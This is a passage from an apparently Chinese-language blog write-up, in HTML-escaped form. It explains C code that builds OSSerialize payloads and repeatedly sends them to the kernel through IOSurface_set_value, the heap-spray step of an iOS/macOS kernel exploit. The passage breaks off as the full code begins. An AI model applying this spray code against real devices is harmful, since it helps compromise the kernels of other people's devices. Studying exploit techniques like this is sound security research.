&lt;p&gt;这里有很多个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;，每个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;都是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uint32&lt;/code&gt;类型的数据，这个留着后面具体构造的时候再分析，这里计算的是一个完整的XML所需要的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML Unit&lt;/code&gt;，其中包含了256个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;，每个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;所需要占用的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML Unit&lt;/code&gt;为函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xml_units_for_data_size()&lt;/code&gt;计算的结果，此处加1操作是因为每个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;需要一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kOSSerializeString&lt;/code&gt;作为元素标签，这个标签占用1个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uint32&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units_per_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面计算完需要的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xml_units&lt;/code&gt;之后，下面开始分配内存空间，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xml[0]&lt;/code&gt;为变长数组&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurfaceValueArgs&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;surface_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_out1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurfaceValueArgs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这是很重要的一步，此前计算的几个数据会在这里传入函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serialize_IOSurface_data_array()&lt;/code&gt;进行最终的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML&lt;/code&gt;构造&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize_IOSurface_data_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serialize_IOSurface_data_array()&lt;/code&gt;的构造过程我们前面有详细的解释，前后6个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;在这里体现为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kOSSerializeBinarySignature&lt;/code&gt;等元素&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;serialize_IOSurface_data_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeBinarySignature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeEndCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeEndCollection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 记录当前偏移，后续用于填充data&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units_for_data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeSymbol&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kOSSerializeEndCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;// This will be filled in on each array loop.&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;// Null-terminate the symbol.&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最终构造的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML&lt;/code&gt;如下&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;kOSSerializeBinarySignature&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;kOSSerializeArray&amp;gt;&lt;/span&gt;2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/kOSSerializeArray&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;kOSSerializeArray&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;length=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${array_length}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;kOSSerializeData&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;length=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${data_size&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;1}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- xml_data[0] --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/kOSSerializeData&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;kOSSerializeData&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;length=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${data_size&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;1}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- xml_data[1] --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/kOSSerializeData&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;kOSSerializeData&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;length=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${data_size&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;1}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- xml_data[array_length - 1] --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/kOSSerializeData&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/kOSSerializeArray&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;kOSSerializeSymbol&amp;gt;&lt;/span&gt;${sizeof(uint32_t) + 1}&lt;span class=&quot;nt&quot;&gt;&amp;lt;/kOSSerializeSymbol&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;key&amp;gt;&lt;/span&gt;${key}&lt;span class=&quot;nt&quot;&gt;&amp;lt;/key&amp;gt;&lt;/span&gt;
0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时我们拥有了一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML&lt;/code&gt;模板，开始往里面填充数据，填充的数据分为两部分，一部分是构造的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;，另一部分是标识&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt;，完成填充后调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOSurface_set_value()&lt;/code&gt;，该函数是函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOConnectCallMethod()&lt;/code&gt;的封装，用于向内核发送数据&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base255_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total_arrays&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurface_set_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;完整的主代码如下，我去掉了一部分不会访问到的逻辑&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_arrays&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
